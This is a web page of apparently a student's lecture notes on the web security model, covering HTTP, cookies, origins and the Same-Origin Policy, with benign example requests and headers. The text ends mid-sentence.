<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Web Security Model # Web security goals # Safely browse the web: Sites should not be able to steal data from device, install malware, access camera, etc Sites should not be able to affect or eavesdrop on other sessions Support secure high-performance web apps Web-based applications should have same or better security properties as desktop applications Attack models # Malicious website Malicious external resources Network attacker Malware attacker HTTP protocol # ASCII protocol from 1989 that allows fetching resources (e."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content><meta property="og:description" content="Web Security Model # Web security goals # Safely browse the web: Sites should not be able to steal data from device, install malware, access camera, etc Sites should not be able to affect or eavesdrop on other sessions Support secure high-performance web apps Web-based applications should have same or better security properties as desktop applications Attack models # Malicious website Malicious external resources Network attacker Malware attacker HTTP protocol # ASCII protocol from 1989 that allows fetching resources (e."><meta property="og:type" content="article"><meta property="og:url" content="https://saligrama.io/notes/cs155/2022-04-18-web-security/"><meta property="article:section" content="cs155"><title>Web Security | Aditya's notes</title><link rel=manifest href=/notes/manifest.json><link rel=icon href=/notes/favicon.png type=image/x-icon><link rel=stylesheet href=/notes/book.min.395a67680f48b8d23bbf267f26d0d1259e69554b2b704e371e8e15cbe656e05f.css integrity="sha256-OVpnaA9IuNI7vyZ/JtDRJZ5pVUsrcE43Ho4Vy+ZW4F8=" crossorigin=anonymous><script defer src=/notes/flexsearch.min.js></script>
<script defer src=/notes/en.search.min.809090c2b6e288a5eba3b4bdba33674d5f9c0283e0a2c243f3c434b4f4e88382.js integrity="sha256-gJCQwrbiiKXro7S9ujNnTV+cAoPgosJD88Q0tPTog4I=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/notes/><span>Aditya's notes</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><input type=checkbox id=section-a88f46c31d1ebdf165810583424fda37 class=toggle>
<label for=section-a88f46c31d1ebdf165810583424fda37 class="flex justify-between"><a role=button>CS 103, Fall 2020</a></label><ul><li><a href=/notes/cs103/2020-09-16-set-theory/>Set Theory</a></li><li><a href=/notes/cs103/2020-09-18-indirect-proofs/>Indirect Proofs</a></li><li><a href=/notes/cs103/2020-09-18-mathematical-proofs/>Mathematical Proofs</a></li><li><a href=/notes/cs103/2020-09-26-first-order-logic/>First Order Logic</a></li><li><a href=/notes/cs103/2020-09-26-propositional-logic/>Propositional Logic</a></li><li><a href=/notes/cs103/2020-09-27-first-order-logic-continued/>First Order Logic Continued</a></li><li><a href=/notes/cs103/2020-09-30-binary-relations/>Binary Relations</a></li><li><a href=/notes/cs103/2020-10-01-binary-relations-continued/>Binary Relations Continued</a></li><li><a href=/notes/cs103/2020-10-04-functions/>Functions</a></li><li><a href=/notes/cs103/2020-10-10-cardinality/>Cardinality</a></li><li><a href=/notes/cs103/2020-10-11-graph-theory/>Graph Theory</a></li><li><a href=/notes/cs103/2020-10-17-pigeonhole-principle/>Pigeonhole Principle</a></li><li><a href=/notes/cs103/2020-10-18-induction/>Induction</a></li><li><a href=/notes/cs103/2020-10-19-induction-variants/>Induction Variants</a></li><li><a href=/notes/cs103/2020-10-20-computability-and-formal-languages/>Computability and Formal Languages</a></li><li><a href=/notes/cs103/2020-10-25-nondeterministic-finite-automata/>Nondeterministic Finite Automata</a></li><li><a href=/notes/cs103/2020-10-26-nfa-dfa-equivalence/>Nfa Dfa Equivalence</a></li><li><a href=/notes/cs103/2020-10-26-regular-expressions/>Regular Expressions</a></li><li><a href=/notes/cs103/2020-11-01-nonregular-languages/>Nonregular Languages</a></li><li><a href=/notes/cs103/2020-11-02-context-free-grammars/>Context Free Grammars</a></li><li><a href=/notes/cs103/2020-11-03-turing-machines/>Turing Machines</a></li><li><a href=/notes/cs103/2020-11-08-turing-machine-subroutines/>Turing Machine Subroutines</a></li><li><a href=/notes/cs103/2020-11-08-universal-turing-machine/>Universal Turing Machine</a></li><li><a href=/notes/cs103/2020-11-08-unsolvable-problems/>Unsolvable Problems</a></li><li><a href=/notes/cs103/2020-11-14-unsolvable-problems-continued/>Unsolvable Problems Continued</a></li></ul></li><li><input type=checkbox id=section-cf13475a7a80a5dd57b5a55dce73d171 class=toggle>
<label for=section-cf13475a7a80a5dd57b5a55dce73d171 class="flex justify-between"><a role=button>CS 107, Fall 2020</a></label><ul><li><a href=/notes/cs107/2020-09-18-integer-representations/>Integer Representations</a></li><li><a href=/notes/cs107/2020-09-21-bitwise-operations/>Bitwise Operations</a></li><li><a href=/notes/cs107/2020-09-25-c-chars-and-strings/>C Chars and Strings</a></li><li><a href=/notes/cs107/2020-09-28-more-c-strings/>More C Strings</a></li><li><a href=/notes/cs107/2020-10-02-pointers-arrays/>Pointers Arrays</a></li><li><a href=/notes/cs107/2020-10-05-stack-and-heap/>Stack and Heap</a></li><li><a href=/notes/cs107/2020-10-09-c-generics/>C Generics</a></li><li><a href=/notes/cs107/2020-10-12-function-pointers/>Function Pointers</a></li><li><a href=/notes/cs107/2020-10-16-assembly/>Assembly</a></li><li><a href=/notes/cs107/2020-10-19-assembly-arithmetic-logic/>Assembly Arithmetic Logic</a></li><li><a href=/notes/cs107/2020-10-23-assembly-control-flow/>Assembly Control Flow</a></li><li><a href=/notes/cs107/2020-10-26-assembly-function-calls-and-return-stack/>Assembly Function Calls and Return Stack</a></li><li><a href=/notes/cs107/2020-10-30-heap-management/>Heap Management</a></li><li><a href=/notes/cs107/2020-11-09-program-optimization/>Program Optimization</a></li></ul></li><li><input type=checkbox id=section-4e3bc6e2f7a0feae33c3e43356d49c80 class=toggle>
<label for=section-4e3bc6e2f7a0feae33c3e43356d49c80 class="flex justify-between"><a role=button>CS 110L, Spring 2021</a></label><ul><li><a href=/notes/cs110l/2021-03-30-course-overview/>Course Overview</a></li><li><a href=/notes/cs110l/2021-04-01-fixing-c/>Fixing C</a></li><li><a href=/notes/cs110l/2021-04-06-intro-to-rust/>Intro to Rust</a></li><li><a href=/notes/cs110l/2021-04-08-ownership/>Ownership</a></li><li><a href=/notes/cs110l/2021-04-13-error-handling/>Error Handling</a></li><li><a href=/notes/cs110l/2021-04-22-traits/>Traits</a></li><li><a href=/notes/cs110l/2021-04-27-generics/>Generics</a></li><li><a href=/notes/cs110l/2021-04-29-multiprocessing/>Multiprocessing</a></li></ul></li><li><input type=checkbox id=section-23e7773af736437c02202412a988f2db class=toggle>
<label for=section-23e7773af736437c02202412a988f2db class="flex justify-between"><a role=button>CS 111, Spring 2021</a></label><ul><li><a href=/notes/cs111/2021-03-31-threads-and-dispatching/>Threads and Dispatching</a></li><li><a href=/notes/cs111/2021-04-02-concurrency/>Concurrency</a></li><li><a href=/notes/cs111/2021-04-05-synchronization/>Synchronization</a></li><li><a href=/notes/cs111/2021-04-07-shared-memory-and-condition-variables-and-locks/>Shared Memory and Condition Variables and Locks</a></li><li><a href=/notes/cs111/2021-04-09-lock-implementation-and-deadlocking/>Lock Implementation and Deadlocking</a></li><li><a href=/notes/cs111/2021-04-12-scheduling/>Scheduling</a></li><li><a href=/notes/cs111/2021-04-14-multiprocessing/>Multiprocessing</a></li><li><a href=/notes/cs111/2021-04-16-linking/>Linking</a></li><li><a href=/notes/cs111/2021-04-19-storage-management/>Storage Management</a></li><li><a href=/notes/cs111/2021-04-21-virtual-memory/>Virtual Memory</a></li><li><a href=/notes/cs111/2021-04-23-dynamic-address-translation/>Dynamic Address Translation</a></li><li><a href=/notes/cs111/2021-04-26-segmentation-and-paging/>Segmentation and Paging</a></li><li><a href=/notes/cs111/2021-04-30-demand-paging/>Demand Paging</a></li><li><a href=/notes/cs111/2021-05-05-disks/>Disks</a></li><li><a href=/notes/cs111/2021-05-07-file-systems/>File Systems</a></li><li><a href=/notes/cs111/2021-05-10-realworld-filesystem-structures/>Realworld Filesystem Structures</a></li><li><a href=/notes/cs111/2021-05-12-directories/>Directories</a></li><li><a href=/notes/cs111/2021-05-14-crash-recovery/>Crash Recovery</a></li><li><a href=/notes/cs111/2021-05-19-protection/>Protection</a></li><li><a href=/notes/cs111/2021-05-24-flash-memory/>Flash Memory</a></li><li><a href=/notes/cs111/2021-05-28-virtual-machines/>Virtual Machines</a></li></ul></li><li><input type=checkbox id=section-a586b190ebf0a4874cd21a1d76743261 class=toggle>
<label for=section-a586b190ebf0a4874cd21a1d76743261 class="flex justify-between"><a role=button>CS 143, Spring 2022</a></label><ul><li><a href=/notes/cs143/2022-03-29-intro/>Intro</a></li><li><a href=/notes/cs143/2022-03-31-language-design-and-cool/>Language Design and Cool</a></li><li><a href=/notes/cs143/2022-04-05-lexical-analysis/>Lexical Analysis</a></li><li><a href=/notes/cs143/2022-04-07-lexical-analysis-implementation/>Lexical Analysis Implementation</a></li><li><a href=/notes/cs143/2022-04-12-parsing/>Parsing</a></li><li><a href=/notes/cs143/2022-04-14-syntax-directed-translation/>Syntax Directed Translation</a></li><li><a href=/notes/cs143/2022-04-19-top-down-parsing/>Top Down Parsing</a></li><li><a href=/notes/cs143/2022-04-26-semantic-analysis/>Semantic Analysis</a></li></ul></li><li><input type=checkbox id=section-37836de7a703e433b2642097d511f482 class=toggle>
<label for=section-37836de7a703e433b2642097d511f482 class="flex justify-between"><a role=button>CS 149, Fall 2022</a></label><ul><li><a href=/notes/cs149/2022-09-27-intro/>Intro</a></li><li><a href=/notes/cs149/2022-09-29-modern-multicore-processors/>Modern Multicore Processors</a></li><li><a href=/notes/cs149/2022-10-04-parallel-abstractions/>Parallel Abstractions</a></li><li><a href=/notes/cs149/2022-10-06-parallel-models/>Parallel Models</a></li><li><a href=/notes/cs149/2022-10-11-work-distribution-and-scheduling/>Work Distribution and Scheduling</a></li><li><a href=/notes/cs149/2022-10-13-locality-communication-and-contention/>Locality Communication and Contention</a></li><li><a href=/notes/cs149/2022-10-18-gpu-architecture-and-cuda/>Gpu Architecture and Cuda</a></li><li><a href=/notes/cs149/2022-10-20-data-parallel-architecture/>Data Parallel Architecture</a></li><li><a href=/notes/cs149/2022-10-25-spark/>Spark</a></li><li><a href=/notes/cs149/2022-10-27-cache-coherence/>Cache Coherence</a></li><li><a href=/notes/cs149/2022-11-01-memory-consistency/>Memory Consistency</a></li><li><a href=/notes/cs149/2022-11-03-lock-implementation-and-lock-free-programming/>Lock Implementation and Lock Free Programming</a></li><li><a href=/notes/cs149/2022-11-10-transactional-memory/>Transactional Memory</a></li><li><a href=/notes/cs149/2022-11-29-heterogeneous-processing-and-domain-specific-languages/>Heterogeneous Processing and Domain Specific Languages</a></li><li><a href=/notes/cs149/2022-12-06-asics-and-fpgas/>Asics and Fpgas</a></li></ul></li><li><input type=checkbox id=section-4f9fa520660f975442d4640415905b3c class=toggle>
<label for=section-4f9fa520660f975442d4640415905b3c class="flex justify-between"><a role=button>CS 154, Fall 2021</a></label><ul><li><a href=/notes/cs154/2021-09-28-finite-automata/>Finite Automata</a></li><li><a href=/notes/cs154/2021-10-05-pumping-lemma-and-myhill-nerode/>Pumping Lemma and Myhill Nerode</a></li><li><a href=/notes/cs154/2021-10-12-streaming-algorithms-and-turing-machines/>Streaming Algorithms and Turing Machines</a></li></ul></li><li><input type=checkbox id=section-d24cd7d7d21fe73135d596a09b50887f class=toggle checked>
<label for=section-d24cd7d7d21fe73135d596a09b50887f class="flex justify-between"><a role=button>CS 155, Spring 2022</a></label><ul><li><a href=/notes/cs155/2022-03-28-intro/>Intro</a></li><li><a href=/notes/cs155/2022-03-30-control-hijacking/>Control Hijacking</a></li><li><a href=/notes/cs155/2022-04-04-control-hijacking-defenses/>Control Hijacking Defenses</a></li><li><a href=/notes/cs155/2022-04-06-security-principles/>Security Principles</a></li><li><a href=/notes/cs155/2022-04-11-isolation-and-sandboxing/>Isolation and Sandboxing</a></li><li><a href=/notes/cs155/2022-04-13-vuln-finding/>Vuln Finding</a></li><li><a href=/notes/cs155/2022-04-18-web-security/ class=active>Web Security</a></li><li><a href=/notes/cs155/2022-04-20-web-attacks/>Web Attacks</a></li><li><a href=/notes/cs155/2022-04-25-web-defenses/>Web Defenses</a></li><li><a href=/notes/cs155/2022-05-04-processor-security/>Processor Security</a></li><li><a href=/notes/cs155/2022-05-09-internet-protocol-security/>Internet Protocol Security</a></li></ul></li><li><input type=checkbox id=section-471622039e8d87cd8d642483c8d218b8 class=toggle>
<label for=section-471622039e8d87cd8d642483c8d218b8 class="flex justify-between"><a role=button>CS 161, Winter 2022</a></label><ul><li><a href=/notes/cs161/2022-01-03-intro/>Intro</a></li><li><a href=/notes/cs161/2022-01-05-worst-case-and-asymptotic-analysis/>Worst Case and Asymptotic Analysis</a></li><li><a href=/notes/cs161/2022-01-10-recurrence-relations/>Recurrence Relations</a></li><li><a href=/notes/cs161/2022-01-12-median-and-selection/>Median and Selection</a></li><li><a href=/notes/cs161/2022-01-19-randomized-algorithms-and-quicksort/>Randomized Algorithms and Quicksort</a></li><li><a href=/notes/cs161/2022-01-24-sorting-lower-bounds/>Sorting Lower Bounds</a></li><li><a href=/notes/cs161/2022-01-26-binary-search-trees/>Binary Search Trees</a></li><li><a href=/notes/cs161/2022-01-31-hashing/>Hashing</a></li><li><a href=/notes/cs161/2022-02-02-graphs-and-graph-search/>Graphs and Graph Search</a></li><li><a href=/notes/cs161/2022-02-07-strongly-connected-components/>Strongly Connected Components</a></li><li><a href=/notes/cs161/2022-02-09-weighted-graphs-and-dijkstra/>Weighted Graphs and Dijkstra</a></li><li><a href=/notes/cs161/2022-02-14-dynamic-programming/>Dynamic Programming</a></li><li><a href=/notes/cs161/2022-02-16-dynamic-programming-applications/>Dynamic Programming Applications</a></li><li><a href=/notes/cs161/2022-02-23-greedy-algorithms/>Greedy Algorithms</a></li><li><a href=/notes/cs161/2022-02-28-minimum-spanning-trees/>Minimum Spanning Trees</a></li></ul></li><li><input type=checkbox id=section-0794dc87987599843ba69a8ea82e9b6a class=toggle>
<label for=section-0794dc87987599843ba69a8ea82e9b6a class="flex justify-between"><a role=button>CS 224U, Spring 2021</a></label><ul><li><a href=/notes/cs224u/2021-03-29-course-overview/>Course Overview</a></li><li><a href=/notes/cs224u/2021-03-31-vector-space-models/>Vector Space Models</a></li><li><a href=/notes/cs224u/2021-04-12-sentiment-analysis/>Sentiment Analysis</a></li></ul></li><li><input type=checkbox id=section-efae8264f5fe410feb1b40be6f99baea class=toggle>
<label for=section-efae8264f5fe410feb1b40be6f99baea class="flex justify-between"><a role=button>CS 229, Fall 2021</a></label><ul><li><a href=/notes/cs229/2021-09-21-intro/>Intro</a></li><li><a href=/notes/cs229/2021-09-23-supervised-learning-setup/>Supervised Learning Setup</a></li><li><a href=/notes/cs229/2021-09-28-logistic-regression/>Logistic Regression</a></li><li><a href=/notes/cs229/2021-09-30-generalized-linear-models/>Generalized Linear Models</a></li><li><a href=/notes/cs229/2021-10-05-generative-learning-algorithms/>Generative Learning Algorithms</a></li><li><a href=/notes/cs229/2021-10-07-naive-bayes/>Naive Bayes</a></li><li><a href=/notes/cs229/2021-10-12-kernel-methods-and-svm/>Kernel Methods and Svm</a></li><li><a href=/notes/cs229/2021-10-14-deep-learning/>Deep Learning</a></li><li><a href=/notes/cs229/2021-10-19-deep-learning-optimization/>Deep Learning Optimization</a></li><li><a href=/notes/cs229/2021-10-21-model-selection/>Model Selection</a></li></ul></li><li><input type=checkbox id=section-58493bdbfe80396f07f44c40ecf068c8 class=toggle>
<label for=section-58493bdbfe80396f07f44c40ecf068c8 class="flex justify-between"><a role=button>CS 249I, Winter 2023</a></label><ul><li><a href=/notes/cs249i/2023-01-09-internet-players/>Internet Players</a></li><li><a href=/notes/cs249i/2023-01-18-modern-routing-practices/>Modern Routing Practices</a></li><li><a href=/notes/cs249i/2023-01-23-last-mile-access/>Last Mile Access</a></li><li><a href=/notes/cs249i/2023-01-25-host-and-network-addressing/>Host and Network Addressing</a></li><li><a href=/notes/cs249i/2023-01-30-domain-name-system/>Domain Name System</a></li></ul></li><li><input type=checkbox id=section-292ea4e126876f1048e61c4dc744546c class=toggle>
<label for=section-292ea4e126876f1048e61c4dc744546c class="flex justify-between"><a role=button>CS 251, Fall 2022</a></label><ul><li><a href=/notes/cs251/2022-09-26-intro/>Intro</a></li><li><a href=/notes/cs251/2022-09-28-bitcoin-mechanics/>Bitcoin Mechanics</a></li><li><a href=/notes/cs251/2022-10-03-bitcoin-scripts-and-wallets/>Bitcoin Scripts and Wallets</a></li><li><a href=/notes/cs251/2022-10-05-consensus/>Consensus</a></li><li><a href=/notes/cs251/2022-10-10-internet-consensus/>Internet Consensus</a></li><li><a href=/notes/cs251/2022-10-17-ethereum/>Ethereum</a></li><li><a href=/notes/cs251/2022-10-19-solidity/>Solidity</a></li><li><a href=/notes/cs251/2022-11-02-legal-aspects-and-regulation/>Legal Aspects and Regulation</a></li><li><a href=/notes/cs251/2022-11-07-privacy-and-deanonymization-and-mixing/>Privacy and Deanonymization and Mixing</a></li><li><a href=/notes/cs251/2022-11-09-privacy-via-zk-snarks/>Privacy via Zk Snarks</a></li></ul></li><li><input type=checkbox id=section-98d861db134658b3e020a9d74c50ad24 class=toggle>
<label for=section-98d861db134658b3e020a9d74c50ad24 class="flex justify-between"><a role=button>CS 255, Winter 2022</a></label><ul><li><a href=/notes/cs255/2022-01-03-intro/>Intro</a></li><li><a href=/notes/cs255/2022-01-05-stream-ciphers/>Stream Ciphers</a></li><li><a href=/notes/cs255/2022-01-10-block-ciphers/>Block Ciphers</a></li><li><a href=/notes/cs255/2022-01-12-pseudorandom-functions/>Pseudorandom Functions</a></li><li><a href=/notes/cs255/2022-01-19-data-integrity-and-macs/>Data Integrity and Macs</a></li><li><a href=/notes/cs255/2022-01-24-collision-resistance/>Collision Resistance</a></li><li><a href=/notes/cs255/2022-01-26-authenticated-encryption/>Authenticated Encryption</a></li><li><a href=/notes/cs255/2022-01-31-key-management/>Key Management</a></li><li><a href=/notes/cs255/2022-02-02-key-exchange-math/>Key Exchange Math</a></li><li><a href=/notes/cs255/2022-02-07-public-key-encryption/>Public Key Encryption</a></li><li><a href=/notes/cs255/2022-02-09-pke-schemes/>Pke Schemes</a></li><li><a href=/notes/cs255/2022-02-14-digital-signatures/>Digital Signatures</a></li><li><a href=/notes/cs255/2022-02-16-certificates/>Certificates</a></li><li><a href=/notes/cs255/2022-02-23-id-protocols/>Id Protocols</a></li><li><a href=/notes/cs255/2022-02-28-key-exchange-protocols/>Key Exchange Protocols</a></li><li><a href=/notes/cs255/2022-03-02-zero-knowledge-protocols/>Zero Knowledge Protocols</a></li><li><a href=/notes/cs255/2022-03-07-quantum-cryptography/>Quantum Cryptography</a></li></ul></li><li><input type=checkbox id=section-3c4550884ed49f470e55fabac7077d16 class=toggle>
<label for=section-3c4550884ed49f470e55fabac7077d16 class="flex justify-between"><a role=button>Cs153</a></label><ul><li><a href=/notes/cs153/2023-01-12-intro/>Intro</a></li></ul></li><li><input type=checkbox id=section-568ed1bc8289796d56a6d06a22d7eb40 class=toggle>
<label for=section-568ed1bc8289796d56a6d06a22d7eb40 class="flex justify-between"><a role=button>INTLPOL 268, Fall 2021</a></label><ul><li><a href=/notes/intlpol268/2021-09-20-intro/>Intro</a></li><li><a href=/notes/intlpol268/2021-09-22-legal-intro-and-electronic-communications-privacy-act/>Legal Intro and Electronic Communications Privacy Act</a></li><li><a href=/notes/intlpol268/2021-09-27-web-requests-and-attacks/>Web Requests and Attacks</a></li><li><a href=/notes/intlpol268/2021-09-29-ecpa-for-private-actors/>Ecpa for Private Actors</a></li><li><a href=/notes/intlpol268/2021-10-04-cyberattacks/>Cyberattacks</a></li><li><a href=/notes/intlpol268/2021-10-06-computer-fraud-and-abuse-act/>Computer Fraud and Abuse Act</a></li><li><a href=/notes/intlpol268/2021-10-11-network-security/>Network Security</a></li><li><a href=/notes/intlpol268/2021-10-13-cfaa-dmca-and-security-research/>Cfaa Dmca and Security Research</a></li><li><a href=/notes/intlpol268/2021-10-20-data-security-laws/>Data Security Laws</a></li><li><a href=/notes/intlpol268/2021-10-25-corporate-intrusion/>Corporate Intrusion</a></li><li><a href=/notes/intlpol268/2021-10-27-ransomware-and-foreign-hackers/>Ransomware and Foreign Hackers</a></li><li><a href=/notes/intlpol268/2021-11-01-cryptography/>Cryptography</a></li><li><a href=/notes/intlpol268/2021-11-03-cyber-conflict/>Cyber Conflict</a></li><li><a href=/notes/intlpol268/2021-11-08-dark-web-and-cryptocurrencies/>Dark Web and Cryptocurrencies</a></li><li><a href=/notes/intlpol268/2021-11-10-encryption-and-technical-assistance/>Encryption and Technical Assistance</a></li><li><a href=/notes/intlpol268/2021-11-15-malware/>Malware</a></li><li><a href=/notes/intlpol268/2021-11-17-government-hacking/>Government Hacking</a></li><li><a href=/notes/intlpol268/2021-11-29-new-frontiers/>New Frontiers</a></li></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/notes/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Web Security</strong>
<label for=toc-control><img src=/notes/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#web-security-model>Web Security Model</a><ul><li><a href=#web-security-goals>Web security goals</a></li><li><a href=#attack-models>Attack models</a></li><li><a href=#http-protocol>HTTP protocol</a><ul><li><a href=#http-methods>HTTP methods</a></li><li><a href=#external-resources>External resources</a></li><li><a href=#javascript>Javascript</a></li><li><a href=#session-management-via-cookies>Session management via cookies</a></li></ul></li><li><a href=#web-security-model-1>Web Security Model</a><ul><li><a href=#domain-relaxation>Domain relaxation</a></li><li><a href=#same-origin-policy-for-javascript>Same-Origin Policy for Javascript</a></li><li><a href=#same-origin-policy-for-cookies>Same-Origin Policy for Cookies</a><ul><li><a href=#javascript-cookie-access>Javascript cookie access</a></li><li><a href=#third-party-cookie-access>Third-party cookie access</a></li></ul></li></ul></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=web-security-model>Web Security Model
<a class=anchor href=#web-security-model>#</a></h1><h2 id=web-security-goals>Web security goals
<a class=anchor href=#web-security-goals>#</a></h2><ul><li>Safely browse the web:<ul><li>Sites should not be able to steal data from device, install malware, access camera, etc</li><li>Sites should not be able to affect or eavesdrop on other sessions</li></ul></li><li>Support secure high-performance web apps<ul><li>Web-based applications should have same or better security properties as desktop applications</li></ul></li></ul><h2 id=attack-models>Attack models
<a class=anchor href=#attack-models>#</a></h2><ul><li>Malicious website</li><li>Malicious external resources</li><li>Network attacker</li><li>Malware attacker</li></ul><h2 id=http-protocol>HTTP protocol
<a class=anchor href=#http-protocol>#</a></h2><ul><li>ASCII protocol from 1989 that allows fetching resources (e.g. HTML file) from a server<ul><li>Two messages: request and response</li><li>Stateless protocol beyond a single request and response</li></ul></li><li>Every request has a uniform resource location (URL)</li></ul><p><img src=/notes/images/cs155/2022-04-18-url.png alt=URL></p><ul><li><p>Request looks like</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span>GET /index.html HTTP/1.1 
</span></span><span style=display:flex><span>Accept: image/gif, image/x-bitmap, image/jpeg, */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>Connection: Keep-Alive
</span></span><span style=display:flex><span>User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)
</span></span><span style=display:flex><span>Host: www.example.com
</span></span><span style=display:flex><span>Referer: http://www.google.com?q=dingbats
</span></span></code></pre></div><ul><li>First line: method, path, version</li><li>Rest: headers</li><li>There can be a body, but is empty here</li></ul></li><li><p>Response looks like</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.0</span> <span style=color:#bd93f9>200</span> OK
</span></span><span style=display:flex><span>Date<span style=color:#ff79c6>:</span> Sun, 21 Apr 1996 02:20:42 GMT
</span></span><span style=display:flex><span>Server<span style=color:#ff79c6>:</span> Microsoft-Internet-Information-Server/5.0
</span></span><span style=display:flex><span>Content-Type<span style=color:#ff79c6>:</span> text/html
</span></span><span style=display:flex><span>Last-Modified<span style=color:#ff79c6>:</span> Thu, 18 Apr 1996 17:39:05 GMT
</span></span><span style=display:flex><span>Content-Length<span style=color:#ff79c6>:</span> 2543
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>html</span>&gt;Some data... announcement! ... &lt;/<span style=color:#ff79c6>html</span>&gt;
</span></span></code></pre></div><ul><li>First line: status code</li><li>Until empty line: headers</li><li>After empty line: body</li></ul></li><li><p>HTTP/2: released in 2015, mainly performance improvements</p></li></ul><h3 id=http-methods>HTTP methods
<a class=anchor href=#http-methods>#</a></h3><ul><li><code>GET</code>: get the resource at the specified URL (does not accept message body)<ul><li>Should not change server state (some servers do perform side effects)</li></ul></li><li><code>POST</code>: create new resource at URL with payload</li><li><code>PUT</code>: replace target resource with request payload</li><li><code>PATCH</code>: update part of the resource</li><li><code>DELETE</code>: delete specified URL</li></ul><h3 id=external-resources>External resources
<a class=anchor href=#external-resources>#</a></h3><ul><li>When loading a website, browser sends <code>GET</code> request to site, server sends HTML file back<ul><li>Root HTML page can include additional resources (e.g. images, video, fonts)<ul><li>Can include images from different domain</li><li>Can also load other <em>websites</em> within their window: frames/iframes<ul><li>Allows delegating screen area to content from another source (e.g. ads)</li></ul></li></ul></li><li>After parsing page HTML, browser requests additional resources</li></ul></li></ul><h3 id=javascript>Javascript
<a class=anchor href=#javascript>#</a></h3><ul><li>Websites deliver scripts to be run inside of the browser<ul><li>Additional web requests</li><li>Read browser data</li><li>Manipulate page</li><li>Access local hardware</li></ul></li><li>Document Object Model (DOM):<ul><li>Javascript reads/modify pages by interacting with DOM tree</li><li>Object-oriented interface for reading/writing page content</li><li>Browser takes HTML -> structured data (DOM)</li></ul></li><li>Basic execution model:<ul><li>Loads content of root page</li><li>Parses HTML and runs included Javascript</li><li>Fetches additional resources (e.g. images, CSS, Javascript, iframes)</li><li>Responds to events like <code>onClick</code>, <code>onLoad</code>, etc.</li><li>Iterate until page is done loading (which might be never)</li></ul></li></ul><h3 id=session-management-via-cookies>Session management via cookies
<a class=anchor href=#session-management-via-cookies>#</a></h3><ul><li>HTTP is stateless: no session information saved on server</li><li>Session management done via cookies: small pieces of data that a server sends to a browser<ul><li>Browser may store and send back in future requests to site</li><li>Useful for:<ul><li>Session management (e.g. logins)</li><li>Personalization (e.g. user preferences)</li><li>Tracking</li></ul></li></ul></li><li>Setting cookie: in HTTP response header<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span>Set-Cookie: trackingID=3272923427328234
</span></span><span style=display:flex><span>Set-Cookie: userID=F3D947C2
</span></span></code></pre></div></li><li>Sending cookie: in HTTP request header<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span>Cookie: trackingID=3272923427328234
</span></span><span style=display:flex><span>Cookie: userID=F3D947C2
</span></span></code></pre></div></li><li>Example: session involving login
<img src=/notes/images/cs155/2022-04-18-login-cookies.png alt="Login with cookies"></li><li>Websites of the same origin have access to each other&rsquo;s cookies, even if opened in different tabs</li><li>Cookies set by a domain are always sent for any request to that domain<ul><li>Includes subrequests made by a different domain</li><li>Includes both GET and POST requests</li></ul></li></ul><h2 id=web-security-model-1>Web Security Model
<a class=anchor href=#web-security-model-1>#</a></h2><ul><li>Subjects:<ul><li>Origins: a unique <code>scheme://domain:port</code></li><li>The following are different origins:<pre tabindex=0><code>http://saligrama.io
http://www.saligrama.io
http://saligrama.io:8080
https://saligrama.io
</code></pre></li><li>The following are the same origin:<pre tabindex=0><code>https://saligrama.io
https://saligrama.io:443
https://saligrama.io/experience
</code></pre></li></ul></li><li>Objects:<ul><li>DOM tree, DOM storage, cookies, Javascript namespace, hardware permissions</li></ul></li><li>Same Origin Policy (SOP)<ul><li>Goal: isolate content of different origins<ul><li>Confidentiality: script on <code>evil.com</code> should not be allowed to read <code>bank.ch</code></li><li>Integrity: <code>evil.com</code> should not be able to modify the content of <code>bank.ch</code></li></ul></li><li>Bounding origins: windows<ul><li>Every window and frame has an origin</li><li>Origins are blocked from accessing another origin&rsquo;s objects</li><li>If <code>bank.com</code> is loaded in a tab and so is <code>attacker.com</code> then <code>attacker.com</code> cannot<ul><li>Read or write content from <code>bank.com</code></li><li>Read or write <code>bank.com</code>&rsquo;s cookies</li><li>Detect that the other tab has <code>bank.com</code> loaded</li></ul></li><li>If <code>bank.com</code> is loaded in an iframe in <code>attacker.com</code> then <code>attacker.com</code> cannot<ul><li>Read content from <code>bank.com</code>&rsquo;s frame</li><li>Access <code>bank.com</code>&rsquo;s cookies<ul><li>If cookies are included, browser will fulfill the request and potentially display it to the user, but <code>attacker.com</code> cannot actually read the cookies</li></ul></li><li>Detect that <code>bank.com</code> has loaded<ul><li>Note: loading content != seeing or reading said content</li></ul></li></ul></li><li>For other HTTP resources:<ul><li>Images: browser renders cross-origin images, but 